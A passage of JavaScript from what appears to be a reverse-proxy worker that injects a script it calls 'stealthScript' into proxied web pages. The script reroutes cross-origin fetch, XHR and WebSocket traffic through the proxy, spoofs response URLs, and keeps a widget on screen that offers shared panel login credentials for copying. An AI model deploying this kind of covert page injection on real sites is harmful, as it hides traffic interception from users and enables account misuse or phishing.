            rewriteNode(arguments[0]);
            return origAppend.apply(this, arguments);
        };
        const origInsert = Element.prototype.insertBefore;
        Element.prototype.insertBefore = function() {
            rewriteNode(arguments[0]);
            return origInsert.apply(this, arguments);
        };

        function shouldIntercept(urlStr) {
            if(typeof urlStr !== 'string') return false;
            try {
                var u = urlStr.startsWith('http') ? new URL(urlStr) : new URL(urlStr, window.location.origin);
                return u.hostname !== window.location.hostname;
            } catch(e) { return false; }
        }

        var origFetch = window.fetch;
        window.fetch = function(resource, options) {
            let reqUrl = (resource instanceof Request) ? resource.url : resource;
            if (shouldIntercept(reqUrl)) {
                let fullUrl = reqUrl.startsWith('http') ? reqUrl : new URL(reqUrl, window.location.origin).toString();
                let proxyUrl = '/__api_proxy?target=' + encodeURIComponent(fullUrl);
                
                if (resource instanceof Request) {
                    return (async () => {
                        let reqInit = { method: resource.method, headers: resource.headers, credentials: resource.credentials, mode: 'cors', redirect: resource.redirect };
                        if (['POST', 'PUT', 'PATCH'].includes(resource.method)) reqInit.body = await resource.clone().blob();
                        let res = await origFetch.call(window, proxyUrl, reqInit);
                        Object.defineProperty(res, 'url', { value: fullUrl }); 
                        return res;
                    })();
                } else {
                    return origFetch.call(window, proxyUrl, options).then(res => {
                        Object.defineProperty(res, 'url', { value: fullUrl }); 
                        return res;
                    });
                }
            }
            return origFetch.call(window, resource, options);
        };

        var origXhrOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url) {
            this._nxIntercepted = false;
            this._nxUrl = url;
            if(typeof url === 'string' && shouldIntercept(url)) {
                this._nxIntercepted = true;
                let fullUrl = url.startsWith('http') ? url : new URL(url, window.location.origin).toString();
                this._nxUrl = fullUrl;
                url = '/__api_proxy?target=' + encodeURIComponent(fullUrl);
            }
            return origXhrOpen.apply(this,[method, url].concat(Array.prototype.slice.call(arguments, 2)));
        };
        var origXhrRespUrl = Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype, 'responseURL');
        if (origXhrRespUrl) {
            Object.defineProperty(XMLHttpRequest.prototype, 'responseURL', {
                get: function() { return this._nxIntercepted ? this._nxUrl : origXhrRespUrl.get.call(this); }
            });
        }

        var OrigWebSocket = window.WebSocket;
        window.WebSocket = function(url, protocols) {
            try {
                var wsUrl = new URL(url);
                if (wsUrl.hostname !== window.location.hostname) {
                    var proxyWsUrl = new URL('/__ws_proxy?target=' + encodeURIComponent(url), window.location.origin);
                    proxyWsUrl.protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
                    return new OrigWebSocket(proxyWsUrl.toString(), protocols);
                }
            } catch(e) {}
            return new OrigWebSocket(url, protocols);
        };

        // ==========================================
        // ✅ DRAGGABLE & BEAUTIFUL FLOATING WIDGET
        // ==========================================
        window.nxCopyText = function(text, btn) {
            navigator.clipboard.writeText(text).then(() => {
                let origHtml = btn.innerHTML;
                btn.innerHTML = "<svg style='width:16px !important;height:16px !important;color:#10b981 !important;display:block !important;' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' viewBox='0 0 24 24'><polyline points='20 6 9 17 4 12'></polyline></svg>";
                setTimeout(() => { btn.innerHTML = origHtml; }, 1500);
            }).catch(()=>{});
        };

        function makeDraggable(wrapper) {
            let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
            wrapper.onmousedown = dragMouseDown;
            wrapper.ontouchstart = dragMouseDown;

            function dragMouseDown(e) {
                // Ignore clicks on inputs, buttons, or close icon to allow interaction
                if(e.target.tagName === 'INPUT' || e.target.closest('button')) return;
                
                e = e || window.event;
                if (e.type === 'touchstart') {
                    pos3 = e.touches[0].clientX;
                    pos4 = e.touches[0].clientY;
                } else {
                    e.preventDefault(); 
                    pos3 = e.clientX;
                    pos4 = e.clientY;
                }
                document.onmouseup = closeDragElement;
                document.ontouchend = closeDragElement;
                document.onmousemove = elementDrag;
                document.ontouchmove = elementDrag;
            }

            function elementDrag(e) {
                e = e || window.event;
                let clientX = e.type === 'touchmove' ? e.touches[0].clientX : e.clientX;
                let clientY = e.type === 'touchmove' ? e.touches[0].clientY : e.clientY;
                
                pos1 = pos3 - clientX;
                pos2 = pos4 - clientY;
                pos3 = clientX;
                pos4 = clientY;
                
                let newTop = wrapper.offsetTop - pos2;
                let newLeft = wrapper.offsetLeft - pos1;
                
                // Prevent dragging outside the screen
                if (newTop < 0) newTop = 0;
                if (newLeft < 0) newLeft = 0;
                if (newTop + wrapper.offsetHeight > window.innerHeight) newTop = window.innerHeight - wrapper.offsetHeight;
                if (newLeft + wrapper.offsetWidth > window.innerWidth) newLeft = window.innerWidth - wrapper.offsetWidth;

                wrapper.style.top = newTop + "px";
                wrapper.style.left = newLeft + "px";
                wrapper.style.bottom = "auto";
                wrapper.style.right = "auto";
            }

            function closeDragElement() {
                document.onmouseup = null;
                document.onmousemove = null;
                document.ontouchend = null;
                document.ontouchmove = null;
            }
        }

        function initNXWidget() {
            if (document.getElementById('nx-float-widget-wrapper')) return;

            const au = "${autoUser}" || "Not Assigned";
            const ap = "${autoPwd}" || "Not Assigned";

            let wrapper = document.createElement('div');
            wrapper.id = 'nx-float-widget-wrapper';
            wrapper.style.cssText = 'position:fixed !important; bottom:20px !important; right:20px !important; z-index:2147483647 !important; transition: opacity 0.3s ease !important; cursor: move !important;';

            let style = document.createElement('style');
            style.innerHTML = \`
                #nx-float-widget { width:310px !important; background:#0f172a !important; border:2px solid #059669 !important; border-radius:0px !important; box-shadow:0 15px 35px rgba(0,0,0,0.8) !important; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif !important; padding:22px !important; color:#f3f4f6 !important; box-sizing:border-box !important; }
                #nx-float-widget * { box-sizing:border-box !important; margin:0 !important; padding:0 !important; line-height:normal !important; letter-spacing:normal !important; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif !important; text-transform:none !important; }
                .nx-fw-header { display:flex !important; justify-content:space-between !important; align-items:center !important; margin-bottom:12px !important; }
                .nx-fw-title { font-size:15px !important; font-weight:bold !important; color:#10b981 !important; display:flex !important; align-items:center !important; gap:8px !important; pointer-events:none !important; }
                .nx-fw-close { background:none !important; border:none !important; color:#9ca3af !important; cursor:pointer !important; padding:4px !important; border-radius:0px !important; transition:0.2s !important; display:flex !important; align-items:center !important; justify-content:center !important; z-index:10 !important; }
                .nx-fw-close:hover { background:#334155 !important; color:#fff !important; }
                .nx-fw-desc { font-size:12.5px !important; color:#cbd5e1 !important; margin-bottom:20px !important; line-height:1.5 !important; pointer-events:none !important; }
                .nx-fw-field { background:#1e293b !important; border:1px solid #334155 !important; border-radius:0px !important; padding:0 12px !important; margin-bottom:16px !important; height:38px !important; display:flex !important; justify-content:space-between !important; align-items:center !important; }
                .nx-fw-label { font-size:11.5px !important; color:#94a3b8 !important; text-transform:uppercase !important; font-weight:bold !important; margin-bottom:6px !important; display:block !important; text-align:left !important; letter-spacing:0.5px !important; pointer-events:none !important; }
                .nx-fw-val { font-size:14px !important; color:#fff !important; font-weight:500 !important; border:none !important; background:transparent !important; outline:none !important; width:100% !important; text-overflow:ellipsis !important; font-family:monospace !important; pointer-events:none !important; padding:0 !important; height:100% !important; }
                .nx-fw-copy { background:#334155 !important; border:none !important; color:#cbd5e1 !important; border-radius:0px !important; width:26px !important; height:26px !important; cursor:pointer !important; transition:0.2s !important; display:flex !important; align-items:center !important; justify-content:center !important; margin-left:12px !important; flex-shrink:0 !important; padding:0 !important; }
                .nx-fw-copy:hover { background:#475569 !important; color:#10b981 !important; }
            \`;

            let widget = document.createElement('div');
            widget.id = 'nx-float-widget';
            widget.innerHTML = \`
                <div class='nx-fw-header'>
                    <div class='nx-fw-title'>
                        <svg style='width:16px !important;height:16px !important;color:#10b981 !important;display:block !important;' fill='none' stroke='currentColor' viewBox='0 0 24 24'><path stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8V7z'></path></svg>
                        Panel Access
                    </div>
                    <button class='nx-fw-close' id='nx-fw-close-btn' title='Hide for 3s'>
                        <svg style='width:16px !important;height:16px !important;display:block !important;' fill='none' stroke='currentColor' viewBox='0 0 24 24'><path stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M6 18L18 6M6 6l12 12'></path></svg>
                    </button>
                </div>
                <div class='nx-fw-desc'>Copy credentials and paste into the login form.</div>
                
                <label class='nx-fw-label'>Username</label>
                <div class='nx-fw-field'>
                    <input type='text' class='nx-fw-val' value='\${au}' readonly>
                    <button class='nx-fw-copy' onclick='nxCopyText("\${au}", this)' title='Copy Username'>
                        <svg style='width:14px !important;height:14px !important;color:inherit !important;display:block !important;' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' viewBox='0 0 24 24'><rect x='9' y='9' width='13' height='13' rx='2' ry='2'></rect><path d='M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1'></path></svg>
                    </button>
                </div>
                
                <label class='nx-fw-label'>Password</label>
                <div class='nx-fw-field' style='margin-bottom:0 !important;'>
                    <input type='password' class='nx-fw-val' value='\${ap}' readonly>
                    <button class='nx-fw-copy' onclick='nxCopyText("\${ap}", this)' title='Copy Password'>
                        <svg style='width:14px !important;height:14px !important;color:inherit !important;display:block !important;' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' viewBox='0 0 24 24'><rect x='9' y='9' width='13' height='13' rx='2' ry='2'></rect><path d='M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1'></path></svg>
                    </button>
                </div>
            \`;

            wrapper.appendChild(style);
            wrapper.appendChild(widget);
            document.documentElement.appendChild(wrapper);

            // Make the entire widget draggable
            makeDraggable(wrapper);

            // 3 Seconds timeout for Close button
            document.getElementById('nx-fw-close-btn').addEventListener('click', () => {
                wrapper.style.setProperty('display', 'none', 'important');
                setTimeout(() => {
                    wrapper.style.setProperty('display', 'block', 'important');
                }, 3000);
            });
        }

        initNXWidget();
        window.addEventListener('DOMContentLoaded', initNXWidget);
        setInterval(initNXWidget, 1000);

    }catch(e){}
})();
<\/script>`;
                    
                    if (htmlText.includes("<head>")) htmlText = htmlText.replace("<head>", "<head>" + stealthScript); 
                    else htmlText = stealthScript + htmlText;
                    
                    body = htmlText;
                } catch(err) {}
            }
            
            return new Response(body, { status: proxyRes.status, statusText: proxyRes.statusText, headers: responseHeaders });
        }

        return new Response(landingPageHTML, { headers: { "Content-Type": "text/html;charset=UTF-8", "Cache-Control": "no-store" } });
    }
};